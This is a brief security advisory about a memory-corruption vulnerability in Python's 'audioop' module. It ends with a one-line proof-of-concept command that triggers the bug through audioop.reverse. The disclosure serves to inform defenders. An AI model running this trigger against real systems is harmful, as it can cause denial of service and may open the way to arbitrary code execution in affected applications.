The 'audioop' module for Python is prone to a memory-corruption vulnerability.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

 $ python -c "import audioop; audioop.reverse('X', 2)"
